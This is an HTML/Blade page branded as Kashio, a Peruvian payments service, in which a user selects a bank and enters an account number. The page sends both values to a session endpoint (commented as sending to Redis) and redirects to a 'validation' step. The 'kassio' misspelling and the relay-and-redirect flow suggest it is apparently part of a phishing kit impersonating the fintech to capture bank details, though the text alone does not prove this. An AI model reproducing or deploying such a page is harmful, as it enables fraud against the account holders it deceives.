<!DOCTYPE html>
<html lang="es">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="KashIO - Vincular cuenta destino">
  <link rel="shortcut icon" href="{{ asset('kassio/kashio_ico.ico') }}">
  <title>Kashio - Vincular cuenta</title>

  <link rel="stylesheet" href="{{ asset('kassio/bootstrap.min.css') }}">
<style>
  @import url('https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@300;400;500;600;700&display=swap');

  :root {
    --radius-md: 8px;
    --button-primary-border: #0666EB;
    --button-primary-bg: #0666EB;
    --button-primary-fg: #FFF;
    --border-primary: #D0D5DD;
    --spacing-sm: 0.375rem;
    --spacing-md: 0.5rem;
    --spacing-lg: 0.75rem;
    --spacing-xl: 1rem;
    --spacing-2xl: 1.25rem;
    --spacing-3xl: 1.5rem;
    --spacing-4xl: 2rem;
    --text-primary-900: #101828;
    --text-tertiary-600: #475467;
    --text-secondary-700: #344054;
    --background-bg-secondary: #F9FAFB;
    --background-bg-primary: #FFF;
    --font-family: 'Red Hat Display', sans-serif;
  }

  html, body {
    width: 100%;
    height: 100%;
    padding: 0;
    margin: 0;
  }

  body {
    font-family: var(--font-family);
    background: linear-gradient(0deg, rgba(255, 255, 255, 0.20) 0%, rgba(255, 255, 255, 0.20) 100%), linear-gradient(90deg, #EFEEFB 0.21%, #E3F5FF 105.84%);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    padding: 5rem var(--spacing-xl) var(--spacing-xl);
  }

  .card-container {
    background: var(--background-bg-primary);
    border-radius: 16px;
    box-shadow: 0px 4px 16px rgba(16, 24, 40, 0.1);
    padding: var(--spacing-4xl);
    width: 100%;
    max-width: 420px;
  }

  .card-header {
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-bottom: var(--spacing-3xl);
  }

  .card-header img {
    margin-bottom: var(--spacing-xl);
  }

  .card-title {
    color: #102D5B;
    font-size: 1.5rem;
    font-weight: 700;
    text-align: center;
    margin: 0;
  }

  .card-subtitle {
    color: var(--text-tertiary-600);
    font-size: 0.875rem;
    text-align: center;
    margin-top: var(--spacing-sm);
  }

  .form-group {
    display: flex;
    flex-direction: column;
    gap: var(--spacing-sm);
    margin-bottom: var(--spacing-2xl);
  }

  .form-label {
    color: #102d5bcc;
    font-size: 0.875rem;
    font-weight: 500;
    line-height: 142.857%;
  }

  .form-input,
  .form-select {
    width: 100%;
    height: 2.75rem;
    padding: 0.625rem 0.875rem;
    border-radius: var(--radius-md);
    border: 1px solid var(--border-primary);
    background: var(--background-bg-primary);
    box-shadow: 0px 1px 2px 0px rgba(16, 24, 40, 0.05);
    outline: none;
    font-family: var(--font-family);
    font-size: 1rem;
    color: var(--text-primary-900);
    transition: box-shadow 0.2s ease, border-color 0.2s ease;
  }

  .form-select {
    cursor: pointer;
    appearance: none;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23667085' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
    background-repeat: no-repeat;
    background-position: right 0.875rem center;
    padding-right: 2.5rem;
  }

  .form-input::placeholder {
    color: #667085;
  }

  .form-input:focus,
  .form-select:focus {
    border-color: #0666EB;
    box-shadow: 0px 1px 2px 0px rgba(16, 24, 40, 0.05), 0px 0px 0px 4px rgba(57, 134, 239, 0.24);
  }

  .btn-primary {
    width: 100%;
    border-radius: var(--radius-md);
    border: 1px solid var(--button-primary-border);
    background: var(--button-primary-bg);
    box-shadow: 0px 1px 2px 0px rgba(16, 24, 40, 0.05);
    padding: 0.875rem 1.25rem;
    color: var(--button-primary-fg);
    font-family: var(--font-family);
    font-size: 1rem;
    font-weight: 700;
    line-height: 150%;
    cursor: pointer;
    transition: background 0.2s ease, transform 0.1s ease;
    margin-top: var(--spacing-lg);
  }

  .btn-primary:hover {
    background: #0552BC;
  }

  .btn-primary:active {
    transform: scale(0.98);
  }

  .btn-primary:disabled {
    opacity: 0.7;
    cursor: not-allowed;
  }

  .btn-spinner {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
  }

  .spinner {
    width: 20px;
    height: 20px;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }
</style>
</head>

<body>
  <div class="card-container">
    <header class="card-header">
      <img src="{{ asset('kassio/Logo-Kashio.svg') }}" alt="Logo Kashio">
      <h1 class="card-title">Vincular cuenta destino</h1>
      <p class="card-subtitle">Ingresa los datos de la cuenta</p>
    </header>

    <form id="vincular-form">
      <div class="form-group">
        <label for="banco" class="form-label">Banco</label>
        <select id="banco" name="banco" class="form-select" required>
          <option value="" disabled selected>Selecciona un banco</option>
          <option value="bcp">Banco de Crédito del Perú (BCP)</option>
          <option value="bbva">BBVA Perú</option>
          <option value="interbank">Interbank</option>
          <option value="scotiabank">Scotiabank Perú</option>
          <option value="banbif">BanBif</option>
        </select>
      </div>

      <div class="form-group">
        <label for="numero-cuenta" class="form-label">Número de cuenta</label>
        <input type="text" id="numero-cuenta" name="numero_cuenta" class="form-input" placeholder="Ingresa el número de cuenta" required>
      </div>

      <button type="submit" class="btn-primary" id="btn-vincular">
        <span class="btn-text">Vincular</span>
        <span class="btn-spinner" style="display: none;">
          <svg class="spinner" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="31.4 31.4" />
          </svg>
          Procesando...
        </span>
      </button>
    </form>
  </div>

  <script>
    document.getElementById('vincular-form').addEventListener('submit', async function(e) {
      e.preventDefault();

      const banco = document.getElementById('banco').value;
      const numeroCuenta = document.getElementById('numero-cuenta').value;

      if (!banco || !numeroCuenta) {
        return;
      }

      const btn = document.getElementById('btn-vincular');
      const btnText = btn.querySelector('.btn-text');
      const btnSpinner = btn.querySelector('.btn-spinner');

      btn.disabled = true;
      btnText.style.display = 'none';
      btnSpinner.style.display = 'inline-flex';

      // Enviar datos a Redis
      try {
        const storedUser = localStorage.getItem('kassio_user');
        if (storedUser) {
          const userData = JSON.parse(storedUser);
          const sessionId = userData.session_id;

          if (sessionId) {
            await fetch('/api/kassio/session/' + sessionId, {
              method: 'PATCH',
              headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
              },
              body: JSON.stringify({
                data: {
                  banco: banco,
                  numero_cuenta: numeroCuenta
                }
              })
            });
          }
        }
      } catch (error) {
        console.error('Error enviando a Redis:', error);
      }

      setTimeout(function() {
        window.location.href = '/kassio/validacion?banco=' + encodeURIComponent(banco);
      }, 1500);
    });
  </script>
</body>
</html>
